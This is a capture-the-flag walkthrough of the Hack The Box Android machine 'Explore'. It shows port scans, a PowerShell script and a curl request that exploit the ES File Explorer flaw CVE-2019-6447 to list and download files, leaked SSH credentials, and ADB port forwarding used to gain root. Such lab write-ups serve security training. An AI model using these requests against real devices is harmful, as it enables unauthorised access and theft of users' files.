---
title: "Walktrough: HTB Explore"
namespace: htb-explore
language: en-US
category: Walkthrough
tags:
    - HackTheBox
    - HTB Easy
    - HTB Android
date: 2021-10-30 16:00:00
header:
   teaser: https://i.imgur.com/TJKS5F6.png
   og_image: https://i.imgur.com/TJKS5F6.png
---

Hello guys!

This week's machine will be **Explore**, an easy-rated Android box from [Hack The Box](https://www.hackthebox.eu/), created by [bertolis](https://app.hackthebox.eu/users/27897).<!--more-->

:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
{: .notice--info}

![HTB Explore](https://i.imgur.com/0cwBArJ.png){: .align-center}

This was my first Android machine in HTB and, besides not having ADB access directly, I was able to get SSH access from information obtained through a vulnerable app.

Hope you guys enjoy it!

## Enumeration

As usual, started with a quick `nmap` scan to see published ports on this box:

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.247
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-16 14:26 -03
Nmap scan report for 10.10.10.247
Host is up (0.072s latency).
Not shown: 998 closed ports
PORT     STATE    SERVICE VERSION
2222/tcp open     ssh     (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey:
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
5555/tcp filtered freeciv
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2222-TCP:V=7.91%I=7%D=8/16%Time=611A9FDB%P=x86_64-pc-linux-gnu%r(NU
SF:LL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.05 seconds
```

### 5555/TCP - freeciv

As this is my first Android box, started researching about this `freeciv` service found. Interestingly I came across a [write-up for a VulnHub machine](https://medium.com/@samsepio1/android4-vulnhub-writeup-3036f352640f) that mentions that this port is used by ADB (Android Debug Bridge) but, differently from that one, this port is currently **filtered**. Let's keep this information for now until we find a way to open it and get an interactive shell on the device.

To look for any other missing information, ran another `nmap` scan, this time to check all TCP ports, and found the following additional ports open:

```bash
$ nmap -p- -Pn -oA allPorts 10.10.10.247
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Sarting Nmap 7.91 ( https://nmap.org ) at 2021-08-16 14:44 -03
Nmap scan report for 10.10.10.247
Host is up (0.070s latency).
Not shown: 65530 closed ports
PORT      STATE    SERVICE
2222/tcp  open     EtherNetIP-1
5555/tcp  filtered freeciv
37425/tcp open     unknown
42135/tcp open     unknown
59777/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 41.93 seconds
$ nmap -p37425,42135,59777 -sV -Pn -oA Full 10.10.10.247
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-16 14:47 -03
Nmap scan report for 10.10.10.247
Host is up (0.071s latency).

PORT      STATE SERVICE VERSION
37425/tcp open  unknown
42135/tcp open  http    ES File Explorer Name Response httpd
59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port37425-TCP:V=7.91%I=7%D=8/16%Time=611AA4D5%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,AA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Mon,\x20
SF:16\x20Aug\x202021\x2017:48:06\x20GMT\r\nContent-Length:\x2022\r\nConten
SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
SF:r\nInvalid\x20request\x20line:\x20")%r(GetRequest,5C,"HTTP/1\.1\x20412\
SF:x20Precondition\x20Failed\r\nDate:\x20Mon,\x2016\x20Aug\x202021\x2017:4
SF:8:06\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,B5,"HTTP/1\
SF:.0\x20501\x20Not\x20Implemented\r\nDate:\x20Mon,\x2016\x20Aug\x202021\x
SF:2017:48:11\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pla
SF:in;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x2
SF:0supported:\x20OPTIONS")%r(RTSPRequest,BB,"HTTP/1\.0\x20400\x20Bad\x20R
SF:equest\r\nDate:\x20Mon,\x2016\x20Aug\x202021\x2017:48:11\x20GMT\r\nCont
SF:ent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r
SF:\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version:
SF:\x20\x20RTSP/1\.0")%r(Help,AE,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
SF:te:\x20Mon,\x2016\x20Aug\x202021\x2017:48:26\x20GMT\r\nContent-Length:\
SF:x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection
SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP")%r(SSLSessionReq
SF:,DD,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Mon,\x2016\x20Aug\x
SF:202021\x2017:48:26\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20
SF:text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\
SF:x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\?
SF:\0\?\?{\?\?\?\?w\?\?\?\?<=\?o\?\x10n\0\0\(\0\x16\0\x13\0")%r(TerminalSe
SF:rverCookie,CA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Mon,\x201
SF:6\x20Aug\x202021\x2017:48:26\x20GMT\r\nContent-Length:\x2054\r\nContent
SF:-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r
SF:\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20msts
SF:hash=nmap")%r(TLSSessionReq,DB,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
SF:ate:\x20Mon,\x2016\x20Aug\x202021\x2017:48:26\x20GMT\r\nContent-Length:
SF:\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0
SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0");
Service Info: Device: phone

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.01 seconds
```

### 42135/TCP - ES File Explorer Name Response httpd

Searching for this service in `searchsploit` got one result for the Android platform.

```bash
$ searchsploit ES File Explorer
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
ES File Explorer 4.1.9.7.4 - Arbitrary File Read                      | android/remote/50070.py
iOS iFileExplorer Free - Directory Traversal                          | ios/remote/16278.py
MetaProducts Offline Explorer 1.x - FileSystem Disclosure             | windows/remote/20488.txt
Microsoft Internet Explorer / MSN - ICC Profiles Crash (PoC)          | windows/dos/1110.txt
Microsoft Internet Explorer 4.x/5 / Outlook 2000 0/98 0/Express 4.x - | windows/remote/19603.txt
Microsoft Internet Explorer 4/5 - DHTML Edit ActiveX Control File Ste | windows/remote/19094.txt
Microsoft Internet Explorer 5 - ActiveX Object For Constructing Type  | windows/remote/19468.txt
Microsoft Internet Explorer 5 / Firefox 0.8 / OmniWeb 4.x - URI Proto | windows/remote/24116.txt
Microsoft Internet Explorer 5/6 - 'file://' Request Zone Bypass       | windows/remote/22575.txt
Microsoft Internet Explorer 6 - '%USERPROFILE%' File Execution        | windows/remote/22734.html
Microsoft Internet Explorer 6 - Local File Access                     | windows/remote/29619.html
Microsoft Internet Explorer 7 - Arbitrary File Rewrite (MS07-027)     | windows/remote/3892.html
My File Explorer 1.3.1 iOS - Multiple Web Vulnerabilities             | ios/webapps/28975.txt
WebFileExplorer 3.6 - 'user' / 'pass' SQL Injection                   | php/webapps/35851.txt
---------------------------------------------------------------------- ---------------------------------
```

## Initial Access and User flag

Checking this exploit, noticed that it relates to **CVE-2019-6447**, discussed in this post **[Analysis of ES File Explorer Security Vulnerability (CVE-2019–6447) \| by Knownsec 404 team \| Medium](https://medium.com/@knownsec404team/analysis-of-es-file-explorer-security-vulnerability-cve-2019-6447-7f34407ed566)**

This vulnerability consists in a flaw that allow the execution of commands implemented by this app in an unauthenticated way, without the need of any kind of authorization. As it is simple, I have created a Powershell script to enumerate available information:

```powershell
#!/usr/bin/pwsh

$methods = @('listFiles','listPics','listVideos','listAudios','listAppsAll','getDeviceInfo')

foreach($method in $methods){
    Write-host ">>> Method: $method" -foregroundcolor green
    Invoke-RestMethod -method POST -header @{"Content-Type" = "application/json"} -body "{'command':'$method'}" -uri http://10.10.10.247:59777 | fl *
}
```

From the received output, the most interesting result was one picture called `creds.jpg`

```plaintext
>>> Method: listPics

name     : concept.jpg
time     : 4/21/21 02:38:08 AM
location : /storage/emulated/0/DCIM/concept.jpg
size     : 135.33 KB (138,573 Bytes)

name     : anc.png
time     : 4/21/21 02:37:50 AM
location : /storage/emulated/0/DCIM/anc.png
size     : 6.24 KB (6,392 Bytes)

name     : creds.jpg
time     : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size     : 1.14 MB (1,200,401 Bytes)

name     : 224_anc.png
time     : 4/21/21 02:37:21 AM
location : /storage/emulated/0/DCIM/224_anc.png
size     : 124.88 KB (127,876 Bytes)
```

To download the file used the command below, also permited by the vulnerable app found:

```bash
curl --header "Content-Type: application/json" http://10.10.10.247:59777/storage/emulated/0/DCIM/creds.jpg -o creds.jpg
```

Opening the image in a viewer, noticed that we had some credentials on it: **kristi:Kr1sT!5h@Rp3xPl0r3!**

![HTB Explore - creds.jpg](https://i.imgur.com/senu2Y7.png){: .align-center}

These credentials allowed me to connect through SSH on port 2222, as previously enumerated. The first flag was found at `/sdcard/user.txt` file:

```bash
$ ssh kristi@10.10.10.247 -p 2222
Password authentication
Password:
:/ $ cd /sdcard/
:/sdcard $ cat user.txt
<redacted>
```

## Root flag

As now we have SSH rights to this box, we could get root access using ADB shell using SSH Local Port redirection, where I've redirected my attacker's machine 5555/TCP to 5555/TCP in the target, via SSH as seen in the previously mentioned post.

```bash
$ ssh kristi@10.10.10.247 -p 2222 -L 5555:127.0.0.1:5555
Password authentication
Password:
:/ $
```

After this process, just needed to connect to `adb` in attacker machine from port redirection, tunneled through SSH connection and, to get `root` access, just needed to issue the command `su`.

```bash
$ adb connect 127.0.0.1:5555
connected to 127.0.0.1:5555
$ adb shell
x86_64:/ $ su
:/ # find / -type f 2> /dev/null | grep root.txt
/data/root.txt
:/ # cat /data/root.txt
<redacted>
```

I hope you guys have enjoyed this box!

See you in the next post :smiley:
